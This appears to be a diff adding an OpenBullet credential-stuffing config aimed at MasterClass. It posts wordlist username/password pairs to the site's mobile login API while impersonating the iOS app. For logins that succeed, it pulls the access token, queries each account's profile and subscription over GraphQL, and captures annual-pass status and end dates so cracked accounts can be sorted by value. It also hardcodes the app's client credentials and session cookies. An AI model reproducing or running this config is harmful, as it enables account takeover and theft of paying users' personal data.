@@ -1,0 +1,93 @@
+[SETTINGS]
+{
+  "Name": "masterclass api",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-04-22T12:35:39.0676365-04:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "",
+  "Version": "1.2.1",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.masterclass.com/auth/identity/callback" 
+  CONTENT "auth_key=<USER>&grant_type=password&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  SECPROTO TLS11 
+  HEADER "User-Agent: MasterClass/7.13.0 (com.masterclass.production; build:7587; iOS 13.3.1) Alamofire/4.9.1" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Basic NTU4NjIxMThjMzc3MGNhZmM3OWYyMWUzOGJhYzM1M2NiYjUzODY4MGUzYmNmYzc2Yzk1M2I3Njc4OGU5ZTMzYjo2YzU2YTZmYTUwZGM5MTc2MzkwNWY2NzViMzFiYzJjZGUyOTYwNWFiNTg3M2M3M2U0NTY4ZGNmNDZjNzU2M2Fm" 
+  HEADER "x-emb-id: 88D42AA872F848899A9078AB779EDD42" 
+  HEADER "Accept-Encoding: gzip;q=1.0, compress;q=0.5" 
+  HEADER "Accept-Language: en-US;q=1.0" 
+  HEADER "x-emb-st: 1587519074982" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"access_token\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "{\"status\":\"failed\"}" 
+
+PARSE "<SOURCE>" LR "{\"access_token\":\"" "\"," -> VAR "Token" 
+
+FUNCTION RandomString "?h?h?h?h?h?h?h?h-?h?h?h?h-4?h?h?h?h-?h?h?h?h-?h?h?h?h?h?h?h?h?h?h?h?h" -> VAR "guid" 
+
+REQUEST POST "https://www.masterclass.com/graphql" AutoRedirect=FALSE 
+  CONTENT "{\"operationName\":\"me\",\"query\":\"query me {  me {    __typename    email    id    name    first_name    last_name    profile_img_url    last_active_subscription {      __typename      provider      subscription_type      status    }    subscription {      __typename      id      provider      ends_at      starts_at      status      subscription_type    }    aap_apple_product_id    undiscounted_aap_apple_id    profile {      __typename      annual_pass      display_name      city      country      tagline      in_progress_courses {        __typename        id        progress        course {          __typename          id          title          audio_friendly          native_portrait_mobile_image_url          slug          chapters {            __typename            id          }          instructor {            __typename            name          }        }        resume_chapter {          __typename          id          title          number          short_course_number          duration          thumb_url          abstract          video_id          id          offline_enabled          course {            __typename            id          }        }      }      enrolled_courses {        __typename        progress        course {          __typename          id          slug          title          audio_friendly          instructor {            __typename            name          }          native_portrait_mobile_image_url        }        resume_chapter {          __typename          id        }      }      completed_courses {        __typename        course {          __typename          id          slug          title          instructor {            __typename            name          }          native_portrait_mobile_image_url        }      }      recommended_courses {        __typename        id        slug        title        instructor {          __typename          name        }        native_portrait_mobile_image_url      }    }  }}\",\"variables\":null}" 
+  CONTENTTYPE "application/json;charset=utf-8" 
+  SECPROTO TLS11 
+  HEADER "Host: www.masterclass.com" 
+  HEADER "Cookie: _session_id=309ccc9e838f2117b053242ea08d13b1; __cf_bm=b9a48b082239109b091874101b9bc7da3f5fe65d-1587519076-1800-Ac/meme0MFzecMItz/me7j4d8e3z9r6OWIqXa37qPg4Uo+TTXOW3meEY/bi5MrIeXzme3TkQEql1HGvPTtQnCM0=; __cfduid=d01d0d6ded80e686a093bae529ca2f9f41587515209" 
+  HEADER "User-Agent: MasterClass/7587 CFNetwork/1121.2.2 Darwin/19.3.0" 
+  HEADER "X-App-Info: version=7.13.0 bundleID=com.masterclass.production version_code=7587" 
+  HEADER "X-Device-Info: iOS13.3.1, device type=iPhone" 
+  HEADER "X-APOLLO-OPERATION-NAME: me" 
+  HEADER "X-Device-Id: A62A78D4-5077-418B-89DE-B08D39FC7564" 
+  HEADER "apollographql-client-name: com.masterclass.production-apollo-ios" 
+  HEADER "apollographql-client-version: 7.13.0-7587" 
+  HEADER "Content-Length: 2231" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Authorization: Bearer <Token>" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "x-emb-id: F90E79D32E3C4BF690C7FF03BAF0C491" 
+  HEADER "X-Request-Id: C8C082E1-97B4-4C3C-A9E4-46AC76B3748A" 
+  HEADER "Accept: */*" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "If-None-Match: W/\"7696bbaf8454c1efc7f0a59e56256b12\"" 
+  HEADER "App-Authorization: Basic NTU4NjIxMThjMzc3MGNhZmM3OWYyMWUzOGJhYzM1M2NiYjUzODY4MGUzYmNmYzc2Yzk1M2I3Njc4OGU5ZTMzYjo2YzU2YTZmYTUwZGM5MTc2MzkwNWY2NzViMzFiYzJjZGUyOTYwNWFiNTg3M2M3M2U0NTY4ZGNmNDZjNzU2M2Fm" 
+  HEADER "X-NewRelic-ID: XQ4GVlBRGwYHVlZTAwEDVA==" 
+
+PARSE "<SOURCE>" LR "annual_pass\":" ",\"" CreateEmpty=FALSE -> CAP "Annual Pass" 
+
+PARSE "<SOURCE>" LR "\"ends_at\":\"" "\"," CreateEmpty=FALSE -> CAP "Ends at" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "annual_pass\":false,\"" 
+
